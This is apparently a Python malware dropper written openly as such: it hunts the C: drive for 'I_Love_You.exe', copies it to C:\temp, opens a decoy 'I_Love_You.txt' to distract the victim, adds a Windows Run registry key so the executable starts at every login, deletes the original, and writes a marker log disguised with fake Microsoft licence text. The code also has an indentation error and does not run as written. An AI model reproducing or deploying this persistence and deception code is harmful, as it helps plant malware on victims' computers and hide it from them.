import os
import platform
import subprocess
from shutil import copy
from winreg import *

path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
filePath = 'C:\\temp\\I_Love_You.exe'
dst = 'C:\\temp'
admin = 'asdmin'


# Searchs the whole computer for the file
def finder(name, pathS):
    for root, dirs, files in os.walk( pathS ):
        if name in files:
            global pathF, pathB
            pathB = os.path.join( root )
            pathF = os.path.join( root, name )
            return os.path.join( root, name )


def cleaner(name, pathC):
    for root, dirs, files in os.walk( pathC ):
        try:
            if name not in files:
                CleanerRegistry = os.path.join( root, name )
                print( CleanerRegistry )

                # Creates the decoy file
                with open( pathDecoy, 'w' ) as file:
                    file.write( '<3' )
                    file.close()

                try:
                    copy( src, dst )
                    print( '[!] File Copied to safe place' )
                except OSError as E:
                    print( '[!] Exception: ', str( E ) )

                # Opens Decoy File when parent script clicked
                if platform.system() == 'Windows':  # Windows
                    os.startfile( pathDecoy )
                elif platform.system() == 'Darwin':  # MacOS
                    subprocess.Popen( ['start', pathDecoy] )
                else:  # Linux
                    subprocess.Popen( ['xdg-open', pathDecoy] )

                    # Windows only
                    # Try stock access rights with 64bits program to 64bit registry
                try:
                    key = OpenKey( HKEY_CURRENT_USER, path, 0, access=KEY_ALL_ACCESS )
                    SetValueEx( key, 'Registry', 0, REG_SZ, filePath )  # Registry == name of the sub_key to open
                    CloseKey( key )
                except FileNotFoundError:

                    bits = platform.architecture()[0]

                    # https://docs.microsoft.com/en-us/windows/desktop/WinProg64/accessing-an-alternate-registry-view
                    if bits == '32bits':
                        access_right = KEY_WOW64_64KEY
                    if bits == '64bits':
                        access_right = KEY_WOW64_32KEY
                    try:
                        key = OpenKey( HKEY_CURRENT_USER, path, 0, access=KEY_ALL_ACCESS | access_right )
                        SetValueEx( key, 'Registry', 0, REG_SZ, filePath )
                        CloseKey( key )
                    except Exception as e:
                        print( '[!] Exception: %s' % str( e ) )

               os.remove(pathF)
        except FileNotFoundError:
            print( '[!] File not found.' )


finder( 'I_Love_You.exe', 'C:\\' )

src = pathF
pathDecoy = os.path.join( pathB, 'I_Love_You.txt' )
pathCleanerIdentity = os.path.join( dst, 'CleanerRegistry.log' )

cleaner( 'CleanerRegistry.log', 'C:\\temp' )

# Creates one file that will be trigger a cleaner function
with open( pathCleanerIdentity, 'w' ) as file:
    file.write(
            'This file is based on or incorporates material from the projects listed below\n'
            '(collectively, Third Party Code). Microsoft is not the original author of the\n'
            'Third Party Code. The original copyright notice and the license, under which Microsoft\n'
            'received such Third Party Code, are set forth below. Such licenses and notices are\n'
            'provided for informational purposes only. Microsoft, not the third party, licenses\n'
            'the Third Party Code to you under the terms set forth in the EULA for the Microsoft Product.\n'
            'Microsoft reserves all other rights not expressly granted under this agreement, whether by implication,\n'
            'estoppel or otherwise.'
    )
    file.flush()
    file.close()

